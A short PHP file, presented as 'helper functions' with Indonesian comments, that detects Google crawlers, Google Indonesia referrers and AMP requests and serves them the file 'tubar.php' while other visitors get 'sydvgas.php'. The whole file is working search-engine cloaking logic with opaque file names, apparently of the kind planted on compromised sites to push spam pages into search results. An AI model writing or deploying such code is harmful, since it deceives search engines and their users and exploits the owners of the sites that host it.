<?php
/**
 * Helper functions – PHP 5.6 compatible
 */

function get_server_var($key, $default = '') {
    return isset($_SERVER[$key]) ? $_SERVER[$key] : $default;
}

function get_query_var($key, $default = null) {
    return isset($_GET[$key]) ? $_GET[$key] : $default;
}

/**
 * Deteksi request AMP
 */
function is_amp_request() {
    $uri = get_server_var('REQUEST_URI');

    if (strpos($uri, '/amp') !== false) {
        return true;
    }

    if (get_query_var('amp') !== null) {
        return true;
    }

    return false;
}

/**
 * Deteksi Google bot / Google Indonesia
 */
function is_google_indonesia_bot() {
    $user_agent  = get_server_var('HTTP_USER_AGENT');
    $referer     = get_server_var('HTTP_REFERER');
    $accept_lang = strtolower(get_server_var('HTTP_ACCEPT_LANGUAGE'));

    $google_agents = array(
        'Googlebot',
        'Mediapartners-Google',
        'Google-InspectionTool',
        'AdsBot-Google',
        'Googlebot-Image',
        'Googlebot-News',
        'Googlebot-Video',
        'FeedFetcher-Google',
        'Google Favicon',
        'Google-Structured-Data-Testing-Tool'
    );

    foreach ($google_agents as $agent) {
        if (stripos($user_agent, $agent) !== false) {
            return true;
        }
    }

    if (
        strpos($referer, 'google.co.id') !== false ||
        (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)
    ) {
        return true;
    }

    return false;
}

/**
 * Router sederhana
 */
if (is_amp_request()) {
    include __DIR__ . '/tubar.php';
    exit;
}

if (is_google_indonesia_bot()) {
    include __DIR__ . '/tubar.php';
} else {
    include __DIR__ . '/sydvgas.php';
}